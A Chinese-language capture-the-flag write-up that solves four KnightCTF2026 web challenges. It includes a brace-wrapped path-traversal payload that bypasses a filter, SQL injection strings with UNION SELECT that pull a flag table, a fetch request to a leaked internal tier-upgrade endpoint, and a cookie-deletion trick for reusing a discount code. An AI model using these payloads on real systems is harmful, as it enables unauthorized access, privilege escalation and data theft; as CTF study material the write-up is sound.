---
title: KnightCTF2026
published: 2026-01-22
pubDate: 2026-01-22
description: KnightCTF2026 web
pinned: false
tags: ["web"]
author: zsm
category: CTF-web
draft: false
licenseName: "MIT"
lang: "zh_CN"
---

## 前言

打着玩玩，最后一百多名，还好吧，re全部mcp出来了，这里写写web的

## 题目

### Waf

f12可以看见

```html
<!-- @app.after_request    
     def index(filename: str = "index.html"):
     if ".." in filename or "%" in filename:
         return "No no not like that :("
     
     -->
```

过滤了`..`还有`%`，就是不能直接url编码绕过啊或者是双写绕过

自然想到是不是`path.join()`去写的，尝试了一下并不是，ai说尝试`{}`包裹的路径，结果`{index.html}`还真行，那就出来了

> payload: /{.}{.}/{.}{.}/flag.txt

### Admin Panel

登录框尝试sql注入，尝试`username=\&password= OR 1=1#`，发现成功进去，发现cookie改值会复现在页面上，因为是py写的，尝试ssti，发现没用

回头看看登录框，maybe是sql注入，尝试`username=\&password= OR 1=1 ORDER BY X#`把x换成数字看看是几列，发现1和2可以成功跳转，继续注入`username=\&password=%20UNION%20SELECT%201,2%23`，继续注入`username=\&password=%20UNION%20SELECT%20(SELECT%20flag%20FROM%20flag),2%23`看看flag列里面有没有东西，成功拿到

![image](./attachments/260122-114212.avif)

### KnightCloud

这个题主要是分析js代码

```js
window.__KC_INTERNAL__ = {
    config: {
        migrationEndpoints: {
            userTier: "/internal/v1/migrate/user-tier", // 提权接口
            // ...
        }
    },
    features: {
        enableLegacyMigration: !0 // 开启了旧版迁移功能
    },
    helpers: {
        updateUserTier: async (e, r) => { ... } // 直接暴露了修改用户等级的函数
    },
    examples: {
        upgradeUserExample: {
            endpoint: "/api/internal/v1/migrate/user-tier",
            method: "POST",
            body: {
                u: "user-uid-here",
                t: "premium"
            },
            validTiers: ["free", "premium", "enterprise"]
        }
    }
    // ...
}
```

泄露了api`/api/internal/v1/migrate/user-tier`，可以直接提权

```js
fetch("/api/internal/v1/migrate/user-tier", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    u: "08d0e91a-8964-4bea-9807-23402bdd0e50", // 你的 User ID
    t: "premium", // 目标等级
  }),
})
  .then((response) => response.json())
  .then((data) => {
    console.log("服务器响应:", data);
  });
```

### Knight Shop Again

看js

```js
 e.jsx)("button", {
 	onClick: async () => {
 		d("");
 		const e = await fetch("/api/checkout", {
 			method: "POST",
 			headers: {
 				"Content-Type": "application/json"
 			},
 			body: JSON.stringify({
 				discountCode: u > 0 ? o : "",
 				discountCount: u
 			})
 		})
 		  , r = await e.json();
 		e.ok ? (n(c(c({}, t), {}, {
 			balance: r.balance
 		})),
 		l([]),
 		s(0),
 		r.flag ? d("\ud83c\udf89 Purchase successful! Your flag: ".concat(r.flag)) : d("\u2705 Purchase successful!"),
 		setTimeout( () => p("/orders"), 2e3)) : d("\u274c ".concat(r.error))
 	}
 	,
 	className: "btn-primary btn-large",
 	children: "Checkout"
 })]
```

使用优惠码会产生一个cookie去标记，但可以删除后重新使用，优惠码在

```js
function _0x1a8c(input) {
  const base = [75, 78, 73, 71, 72, 84];
  const suffix = [50, 53];

  if (!input || input.length < 5) return { valid: false };

  const prefix = input.substring(0, 6);
  const ending = input.substring(6);

  let match = true;
  for (let i = 0; i < 6; i++) {
    if (prefix.charCodeAt(i) !== base[i]) {
      match = false;
      break;
    }
  }

  if (match && ending.length === 2) {
    if (
      ending.charCodeAt(0) === suffix[0] &&
      ending.charCodeAt(1) === suffix[1]
    ) {
      const cookieName = "promo_applied";
      const existingCookie = document.cookie
        .split(";")
        .find((c) => c.trim().startsWith(cookieName + "="));

      if (existingCookie) {
        return { valid: false };
      }

      document.cookie = cookieName + "=1; path=/";
      return { valid: true, code: input };
    }
  }

  return { valid: false };
}
```

一眼丁真KNIGHT25，那么接下来只需要选择一个商品，然后打折->删cookie->打折 这样循环就行了

## 总结

挺简单的比赛()
